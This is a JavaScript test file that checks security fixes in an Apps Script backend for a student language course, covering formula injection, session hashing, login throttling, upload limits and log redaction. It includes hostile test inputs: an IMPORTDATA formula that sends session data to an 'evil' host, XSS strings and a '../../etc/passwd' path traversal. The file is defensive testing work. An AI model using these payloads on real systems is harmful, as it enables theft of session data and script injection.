/**
 * A2 backend security batch: N-6 (formula injection, hashed session tokens),
 * N-10 (save_audio identity/limits), N-2 server side (speaking_audio_json),
 * N-16 (deactivated accounts, login throttle), N-17 (call requests),
 * SEC-6 (no credentials in the Error Log), SEC-7 (no catch-all POST),
 * N-25 (pepper fails closed), N-28 (own-key handler lookup).
 */
import { describe, it, expect } from 'vitest';
import { loadAppsScriptAuth } from './helpers.js';

const STUDENT = { role: 'student', student_name: 'Maria' };

function account(fp, over = {}) {
  const salt = 'salt1';
  const acct = {
    email: 'maria@x.com', pw_salt: salt, pw_hash: fp.hashPassword('pw123', salt),
    role: 'student', student_name: 'Maria', created_at: '', created_by: 't', active: 'true', ...over,
  };
  const headers = fp.HEADERS['Accounts'];
  const sh = fp._ss.getSheetByName('Accounts') || fp._ss.insertSheet('Accounts');
  if (sh.getLastRow() === 0) sh.appendRow(headers);
  sh.appendRow(headers.map((h) => acct[h]));
  return acct;
}
const sheetRows = (fp, name) => {
  const v = fp._ss.getSheetByName(name).getDataRange().getValues();
  return v.slice(1).map((r) => Object.fromEntries(v[0].map((k, i) => [k, r[i]])));
};

describe('N-6 formula injection', () => {
  it('sheetSafe prefixes only formula-looking strings', () => {
    loadAppsScriptAuth();
    const f = globalThis.sheetSafe;
    for (const bad of ['=1+1', '+1', '-5 degrees', '@SUM(A1)', '\t=x', '\r=x']) expect(f(bad)).toBe("'" + bad);
    for (const ok of ['hello', 'a=b', '5 degrees', '', '{"a":1}', "'quoted"]) expect(f(ok)).toBe(ok);
    expect(f(7)).toBe(7);
    expect(f(null)).toBe(null);
  });

  it('safeAppendRow neutralises student text before it reaches the sheet', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    fp.POST_HANDLERS.update_settings({ student_name: 'Maria', cefr_level: 'A1', access_granted: 'true' }, {});
    fp.POST_HANDLERS.save_progress({
      student_name: 'Maria', level: 'A1', day_number: '1', topic: 'x',
      writing_response: '=IMPORTDATA("https://evil/?"&Sessions!A2)', student_notes: '-5 degrees today',
    }, {}, STUDENT);
    const row = sheetRows(fp, 'Course Progress')[0];
    expect(row.writing_response).toBe('\'=IMPORTDATA("https://evil/?"&Sessions!A2)');
    expect(row.student_notes).toBe("'-5 degrees today");
  });

  it('upsertByStudent and the Error Log are covered too', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    fp.POST_HANDLERS.update_settings({ student_name: 'Maria', notes: '=cmd()' }, {});
    expect(sheetRows(fp, 'Settings')[0].notes).toBe("'=cmd()");
    globalThis.logError('x', '=evil', '+oops', {});
    const log = sheetRows(fp, 'Error Log')[0];
    expect(log.student).toBe("'=evil");
    expect(log.message).toBe("'+oops");
  });
});

describe('N-6 hashed session tokens', () => {
  it('the Sessions sheet and cache never hold the raw token', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const s = fp.createSession(account(fp));
    expect(s.token.length).toBeGreaterThan(8);
    const stored = sheetRows(fp, 'Sessions')[0];
    expect(stored.token).toBe(globalThis.hashSessionToken(s.token));
    expect(stored.token).not.toBe(s.token);
    expect([...fp._cache.keys()].some((k) => k.includes(s.token))).toBe(false);
  });

  it('the raw token validates; the stored hash does not (a leaked sheet is useless)', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const s = fp.createSession(account(fp));
    fp._cache.clear();
    expect(fp.validateSession(s.token)).not.toBeNull();
    fp._cache.clear();
    expect(fp.validateSession(globalThis.hashSessionToken(s.token))).toBeNull();
  });

  it('logout revokes by raw token, and a reset revokes every session', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const a = account(fp);
    const s1 = fp.createSession(a);
    fp.POST_HANDLERS.logout({ session: s1.token }, {});
    expect(fp.validateSession(s1.token)).toBeNull();
    const s2 = fp.createSession(a);
    fp.revokeSessionsForEmail('maria@x.com');
    expect(fp.validateSession(s2.token)).toBeNull();
  });
});

describe('N-16 deactivated accounts and login throttle', () => {
  it('a session stops working once its account is deactivated (after the cache expires)', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const a = account(fp);
    const s = fp.createSession(a);
    expect(fp.validateSession(s.token)).not.toBeNull();
    const sh = fp._ss.getSheetByName('Accounts');
    sh.getRange(2, fp.HEADERS['Accounts'].indexOf('active') + 1).setValue('false');
    fp._cache.clear(); // CACHE_TTL elapsed
    expect(fp.validateSession(s.token)).toBeNull();
  });

  it('successful logins never use up the allowance', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    account(fp);
    for (let i = 0; i < 25; i++) {
      expect(fp.POST_HANDLERS.login({ email: 'maria@x.com', password: 'pw123' }, {})._json.ok).toBe(true);
    }
  });

  it('ten failures lock the email, even for the right password', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    account(fp);
    for (let i = 0; i < 10; i++) fp.POST_HANDLERS.login({ email: 'maria@x.com', password: 'bad' }, {});
    expect(fp.POST_HANDLERS.login({ email: 'maria@x.com', password: 'pw123' }, {})._json.error).toMatch(/too many/i);
  });
});

describe('N-10 save_audio', () => {
  const b64 = Buffer.from('audio-bytes').toString('base64');
  function withDrive() {
    const files = [];
    const folder = { createFile: (blob) => { const f = { getId: () => 'file_' + files.length + '_abcdefghij', setSharing: () => { throw new Error('must not share'); } }; files.push({ blob, folder }); return f; } };
    globalThis.DriveApp = {
      getRootFolder: () => ({}),
      Access: { ANYONE_WITH_LINK: 1 }, Permission: { VIEW: 1 },
    };
    // the shared Utilities mock covers hashing only; add what audio needs
    globalThis.Utilities.base64Decode = (d) => [...Buffer.from(String(d), 'base64')];
    globalThis.Utilities.newBlob = (bytes, mime, name) => ({ bytes, mime, name });
    return { files, folder };
  }

  it('files the audio under the SESSION identity, not the name in the body', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const { files, folder } = withDrive();
    const asked = [];
    globalThis.getAudioFolder = (name, day) => { asked.push([name, day]); return folder; };
    const out = globalThis.handleSaveAudio({ student_name: 'Victim', day_number: 2, recordings: { s1: { data: b64, ext: 'mp4' } } }, STUDENT);
    expect(out.result).toBe('success');
    expect(asked[0][0]).toBe('Maria');
    expect(files.length).toBe(1);
  });

  it('never makes recordings link-public', () => {
    loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const { folder } = withDrive();
    globalThis.getAudioFolder = () => folder;
    // setSharing throws in the stub; a success means it was not called
    expect(globalThis.handleSaveAudio({ day_number: 1, recordings: { s1: { data: b64 } } }, STUDENT).result).toBe('success');
  });

  it('rejects bad keys, bad days, oversized and too many recordings', () => {
    loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const { folder } = withDrive();
    globalThis.getAudioFolder = () => folder;
    const h = (b) => globalThis.handleSaveAudio(b, STUDENT);
    expect(h({ day_number: 1, recordings: { 'x"><img src=x onerror=alert(1)>': { data: b64 } } }).result).toBe('error');
    expect(h({ day_number: 0, recordings: { s1: { data: b64 } } }).result).toBe('error');
    expect(h({ day_number: 21, recordings: { s1: { data: b64 } } }).result).toBe('error');
    expect(h({ day_number: 1, recordings: { s1: { data: 'A'.repeat(10 * 1000 * 1000 + 1) } } }).result).toBe('error');
    const many = {};
    for (let i = 0; i < 13; i++) many['s' + i] = { data: b64 };
    expect(h({ day_number: 1, recordings: many }).result).toBe('error');
  });

  it('only whitelists the file extension and numeric scores', () => {
    loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const { files, folder } = withDrive();
    globalThis.getAudioFolder = () => folder;
    const out = globalThis.handleSaveAudio({
      day_number: 1, recordings: { s1: { data: b64, ext: '../../etc/passwd' } },
      scores: { s1: '0.8', evil: '<b>x</b>', 'bad key': 3 },
    }, STUDENT);
    expect(files[0].blob.name).toBe('s1.webm'); // hostile ext replaced
    const json = JSON.parse(out.audio_json);
    expect(json.s1_score).toBe(0.8);
    expect(json.evil_score).toBeUndefined();
    expect(Object.keys(json).some((k) => k.includes(' '))).toBe(false);
  });
});

describe('N-2 server: speaking_audio_json', () => {
  const owns = (ids) => (id) => ids.includes(id);
  const clean = (raw, ok = []) => globalThis.sanitizeSpeakingAudioJson(raw, 'Maria', owns(ok));

  it('keeps owned file ids and numeric scores', () => {
    loadAppsScriptAuth();
    const out = JSON.parse(clean(JSON.stringify({ s1: 'file_abcdefghij', s1_score: 0.9, conversation: 'conv_abcdefghij' }), ['file_abcdefghij', 'conv_abcdefghij']));
    expect(out).toEqual({ s1: 'file_abcdefghij', s1_score: 0.9, conversation: 'conv_abcdefghij' });
  });

  it('drops hostile keys, foreign file ids, and non-numeric scores', () => {
    const fp = loadAppsScriptAuth();
    const raw = JSON.stringify({
      'x"><img src=x onerror=alert(1)>': 'file_abcdefghij',
      s2: 'someone_elses_file_id',
      s3: { nested: true },
      s1_score: '<script>',
      s4_score: 500,
      s1: 'file_abcdefghij',
    });
    expect(JSON.parse(clean(raw, ['file_abcdefghij']))).toEqual({ s1: 'file_abcdefghij' });
    expect(sheetRows(fp, 'Error Log').some((r) => /Dropped 5/.test(r.message))).toBe(true);
  });

  it('returns empty for junk', () => {
    loadAppsScriptAuth();
    expect(clean('')).toBe('');
    expect(clean('not json')).toBe('');
    expect(clean('[1,2]')).toBe('');
    expect(clean('{}')).toBe('');
  });

  it('save_progress runs it, so a forged id never reaches the sheet', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    fp.POST_HANDLERS.update_settings({ student_name: 'Maria', cefr_level: 'A1', access_granted: 'true' }, {});
    globalThis.DriveApp = undefined; // no Drive: ownership can never be proven
    fp.POST_HANDLERS.save_progress({ student_name: 'Maria', level: 'A1', day_number: '1', topic: 'x',
      speaking_audio_json: JSON.stringify({ 'k"><img>': 'abcdefghijkl', s1: 'abcdefghijkl' }) }, {}, STUDENT);
    expect(sheetRows(fp, 'Course Progress')[0].speaking_audio_json).toBe('');
  });
});

describe('N-17 request_video_call', () => {
  it('re-uses an open request instead of emailing the teacher again', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const a = fp.POST_HANDLERS.request_video_call({ student_name: 'Maria' }, {})._json;
    const mail = fp._mail.length;
    const b = fp.POST_HANDLERS.request_video_call({ student_name: 'Maria' }, {})._json;
    expect(b.id).toBe(a.id);
    expect(b.existing).toBe(true);
    expect(fp._mail.length).toBe(mail);
    expect(sheetRows(fp, 'Video Call Requests').length).toBe(1);
  });

  it('caps new requests per hour once earlier ones are closed', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const close = () => {
      const sh = fp._ss.getSheetByName('Video Call Requests');
      const col = fp.HEADERS['Video Call Requests'].indexOf('status') + 1;
      for (let r = 2; r <= sh.getLastRow(); r++) sh.getRange(r, col).setValue('done');
    };
    for (let i = 0; i < 3; i++) { expect(fp.POST_HANDLERS.request_video_call({ student_name: 'Maria' }, {})._json.result).toBe('success'); close(); }
    expect(fp.POST_HANDLERS.request_video_call({ student_name: 'Maria' }, {})._json.result).toBe('error');
  });
});

describe('SEC-6 Error Log redaction', () => {
  it('redactParams blanks credentials and keeps the rest', () => {
    loadAppsScriptAuth();
    expect(globalThis.redactParams({ session: 'abc', token: 't', password: 'p', reset_token: 'r', email: 'a@b.c', action: 'login' }))
      .toEqual({ session: '[redacted]', token: '[redacted]', password: '[redacted]', reset_token: '[redacted]', email: 'a@b.c', action: 'login' });
  });

  it('a failing login does not write the password to the Error Log', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep', APP_SECRET: 'app' });
    const out = fp.doPost({ parameter: { action: 'save_progress', token: 'app', session: 'sess-secret', password: 'hunter2', student_name: 'Maria' }, postData: null });
    expect(JSON.parse(out.getContent()).result).toBeDefined();
    const log = sheetRows(fp, 'Error Log');
    const text = JSON.stringify(log);
    expect(text).not.toContain('hunter2');
    expect(text).not.toContain('sess-secret');
  });
});

describe('SEC-7 / N-28 dispatch', () => {
  const post = (fp, parameter) => JSON.parse(fp.doPost({ parameter: { token: 'app', ...parameter }, postData: null }).getContent());

  it('a POST with no action is no longer filed as a placement test', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep', APP_SECRET: 'app' });
    const r = post(fp, { candidate_name: 'Maria' });
    expect(r.result).toBe('error');
    expect(r.message).toMatch(/unknown action/i);
    expect(fp._ss.getSheetByName('Initial Test Results')).toBeFalsy();
  });

  it('action=submit_test still saves one', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep', APP_SECRET: 'app' });
    expect(post(fp, { action: 'submit_test', candidate_name: 'Maria' }).result).toBe('success');
    expect(sheetRows(fp, 'Initial Test Results').length).toBe(1);
  });

  it('Object.prototype names are not actions (POST)', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep', APP_SECRET: 'app', AUTH_ENFORCED: 'true' });
    for (const a of ['constructor', 'toString', 'hasOwnProperty', '__proto__']) {
      const r = post(fp, { action: a });
      expect(['Unauthorized']).toContain(r.error); // session requirement is no longer skipped
    }
  });

  it('Object.prototype names are not actions (GET)', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep', APP_SECRET: 'app' });
    const out = JSON.parse(fp.doGet({ parameter: { action: 'constructor', token: 'app' } }).getContent());
    expect(out.error).toMatch(/unknown action/i);
  });
});

describe('N-25 pepper fails closed', () => {
  it('refuses to hash or sign without PW_PEPPER', () => {
    const fp = loadAppsScriptAuth({});
    expect(() => fp.hashPassword('pw', 'salt')).toThrow(/PW_PEPPER/);
    expect(() => fp.createResetToken({ email: 'a@b.c', pw_hash: 'abc' })).toThrow(/PW_PEPPER/);
  });

  it('the emailed reset token no longer contains any of the password hash', () => {
    const fp = loadAppsScriptAuth({ PW_PEPPER: 'pep' });
    const acct = account(fp);
    const token = fp.createResetToken(acct);
    const payload = Buffer.from(token.split('.')[0], 'base64url').toString();
    expect(payload).not.toContain(acct.pw_hash.substring(0, 12));
    expect(fp.consumeResetToken(token).email).toBe('maria@x.com');
  });

  it('health reports pw_pepper and is degraded without it', () => {
    const on = loadAppsScriptAuth({ PW_PEPPER: 'pep', APP_SECRET: 'a', AI_API_KEY: 'k' });
    expect(on.GET_HANDLERS.health({}).pw_pepper).toBe('set');
    const off = loadAppsScriptAuth({ APP_SECRET: 'a', AI_API_KEY: 'k' });
    const h = off.GET_HANDLERS.health({});
    expect(h.pw_pepper).toBe('missing');
    expect(h.status).toBe('degraded');
  });
});
